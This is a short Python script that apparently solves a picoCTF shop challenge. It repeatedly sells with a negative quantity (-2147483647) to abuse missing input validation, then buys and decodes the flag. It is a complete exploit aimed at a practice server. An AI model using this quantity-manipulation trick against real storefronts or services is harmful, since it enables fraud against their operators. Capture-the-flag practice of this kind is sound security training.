from enigma import *


s = connect("mercury.picoctf.net", 10337)

for i in range(6):
    s.recvuntil(b"Choose an option: \n")
    s.send(b"3")
    s.recvuntil(b"sell? \n")
    s.send(b"0")
    s.recvuntil(b"How many?\n")
    s.send(b"-2147483647")

s.recvuntil(b"Choose an option: \n")
s.send(b"2")
s.recvuntil(b"buy?\n")
s.send(b"1")
s.recvuntil(b"[")
flag = s.recvuntil(b"]")[:-1]
print(auto_solve(flag)[0][1].decode('utf-8'))

